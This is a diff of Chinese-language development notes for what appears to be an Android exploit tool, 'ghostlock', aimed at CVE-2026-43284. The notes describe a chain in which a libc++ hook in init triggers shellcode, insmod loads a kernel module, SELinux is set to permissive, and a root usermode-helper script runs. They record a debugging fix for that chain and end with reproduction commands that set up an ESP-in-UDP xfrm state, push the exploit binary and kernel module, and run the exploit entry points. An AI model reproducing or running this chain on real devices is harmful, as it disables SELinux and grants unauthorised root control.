@@ -33,6 +33,7 @@
 - **证据**：清理标记后跑生产路径，`/data/local/tmp/.ghostlock_lkm_ok` **未生成**，且 `root_cmd.sh` 的日志 `/data/local/tmp/.ghostlock_lkm.log` **mtime 未变** → **LKM 的 UMH 脚本根本没有运行**，即 trigger → init 命中 libc++ hook → `insmod` 这条链没有发生。
 - **推论**：此前 staged 运行报的 `run.wait outcome=LkmLoaded` **很可能是陈旧标记误判**（设备上遗留的 `/dev/dfm0`，恰好在 LKM 把 SELinux 置 permissive 的窗口内被 `stat` 到）。因此**不能**据此认为 43284 终态已真机通过。
 - **已解决（2026-10-05）**：dmesg 给出完整链路——`KernelSU: hook_manager: unmark 9552 exec /vendor/bin/insmod`（hook 命中 → shellcode → insmod）、
+
   `ghostlock: selinux_state set permissive`（LKM 加载）、`umh exec returned 32256`（= 退出码 **126**：脚本不可执行）、`selinux_state restored to enforcing`。
   根因是**试验台 `adb push` 覆盖 `/data/local/tmp/.ghostlock_lkm_cmd.sh` 时丢掉 `+x` 位**；`chmod 755` 后 `umh exec returned 0`，
   生产路径 **EXIT=0**、标记 `.ghostlock_lkm_ok` 正常生成。详见 `device-gates/43284-production-20261005-pass.md`。
@@ -41,17 +42,21 @@
 ## 5. 复现命令
 
 ```sh
+
 # 1) 建 SA + encap socket（root）
 su -c "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 proto esp spi 0x4a1f0011 mode transport \
   enc 'cbc(aes)' 0x<AES32> auth-trunc 'hmac(sha256)' 0x<HMAC32> 128 encap espinudp 4500 4500 0.0.0.0"
 su -c 'setsid /data/local/tmp/espencap 4500 </dev/null >/dev/null 2>&1 &'
+
 # 2) 推 native + helper.ko + 文档/帧
 adb push build/native/ghostlock /data/local/tmp/glk
 adb push tools/lkm/ghostlock/out/ghostlock-android13-5.15.ko /data/local/tmp/helper.ko
 adb push /tmp/glk-43284/appcall.bin /data/local/tmp/appcall43284.bin
+
 # 3) 生产路径
 adb shell 'cd /data/local/tmp && GHOSTLOCK_HOME=/data/local/tmp TMPDIR=/data/local/tmp \
   ./glk --ghostlock-app-call --enable-status-record < /data/local/tmp/appcall43284.bin'
+
 # 4) staged（对照，stdin 只用会话帧；⚠ 该入口已随 R2b 删除，仅存档）
 adb shell 'cd /data/local/tmp && GHOSTLOCK_HOME=/data/local/tmp \
   ./glk --run-cve-2026-43284 /data/local/tmp/helper.ko /vendor/lib64/libbinderdebug.so --stage=full < /data/local/tmp/frame.bin'
